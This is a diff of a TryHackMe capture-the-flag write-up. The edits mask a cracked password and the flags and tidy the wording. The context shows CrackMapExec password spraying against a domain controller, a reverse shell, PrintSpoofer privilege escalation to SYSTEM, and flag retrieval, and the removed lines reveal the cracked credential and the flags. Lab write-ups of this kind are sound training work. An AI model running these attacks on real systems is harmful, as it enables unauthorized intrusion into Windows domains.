@@ -144,7 +144,7 @@ Nmap done: 1 IP address (1 host up) scanned in 7.28 seconds
 
 ## CrackMapExec
 
-We know this server is a Windows Domain Controller, with SQL 2019 installed. Let's start with the usual tools for this scenario. First CME:
+We now know this server is a Windows Domain Controller, with SQL 2019 installed. Let's start with one of the usual tools for this scenario, which is CrackMapExec:
 
 ```text
 ┌──(root💀kali)-[~/thm/ustoun]
@@ -201,7 +201,7 @@ SMB         10.10.69.80     445    DC               [-] ustoun.local\SVC-Kerb:je
 SMB         10.10.69.80     445    DC               [-] ustoun.local\SVC-Kerb:joshua STATUS_LOGON_FAILURE 
 SMB         10.10.69.80     445    DC               [-] ustoun.local\SVC-Kerb:bubbles STATUS_LOGON_FAILURE 
 SMB         10.10.69.80     445    DC               [-] ustoun.local\SVC-Kerb:1234567890 STATUS_LOGON_FAILURE 
-SMB         10.10.69.80     445    DC               [+] ustoun.local\SVC-Kerb:superman
+SMB         10.10.69.80     445    DC               [+] ustoun.local\SVC-Kerb:<HIDDEN>
 ```
 
 ## Impacket MSSQLClient
@@ -284,7 +284,7 @@ Copyright (C) 2015 Microsoft Corporation. All rights reserved.
 PS C:\Windows\system32>
 ```
 
-Let's check who are and our permissions:
+Let's check who we are and our permissions:
 
 ```text
 PS C:\Windows\system32>whoami
@@ -331,7 +331,7 @@ PrintSpoofer32.exe                                          100%[===============
 2021-05-23 21:35:38 (3.56 MB/s) - ‘PrintSpoofer32.exe’ saved [22016/22016]
 ```
 
-Now back on the Windows server, first check where we are:
+Now back on the Windows server, first check the path to our home folder:
 
 ```text
 PS C:\Windows\system32> dir c:\users
@@ -358,7 +358,6 @@ I couldn't get the exploit to run from within my Nishang reverse shell. So I dec
 ```text
 ┌──(root💀kali)-[~/thm/ustoun]
 └─# locate nc.exe
-/root/thm/wreath/nc.exe
 /usr/share/windows-resources/binaries/nc.exe
 ```
 
@@ -402,6 +401,7 @@ printspoofer.exe -i -c powershell
 [+] CreateProcessAsUser() OK
 Windows PowerShell 
 Copyright (C) Microsoft Corporation. All rights reserved.
+PS C:\Windows\system32>
 ```
 
 It worked this time, let's check our permissions:
@@ -425,7 +425,7 @@ Mode                LastWriteTime         Length Name
 -a----        1/30/2021   9:21 PM             42 user.txt
 PS C:\Windows\system32> type c:\users\svc-kerb.dc01\desktop\user.txt
 type c:\users\svc-kerb.dc01\desktop\user.txt
-THM{MSSQL_IS_COOL}
+THM{HIDDEN}
 
 PS C:\Windows\system32> dir c:\users\administrator\desktop
 dir c:\users\administrator\desktop
@@ -435,7 +435,7 @@ Mode                LastWriteTime         Length Name
 -a----         2/1/2021  10:48 AM             19 flag.txt
 PS C:\Windows\system32> type c:\users\administrator\desktop\flag.txt
 type c:\users\administrator\desktop\flag.txt
-THM{I_L1kE_gPoS}
+THM{HIDDEN}
 ```
 
 All Done. See you next time.
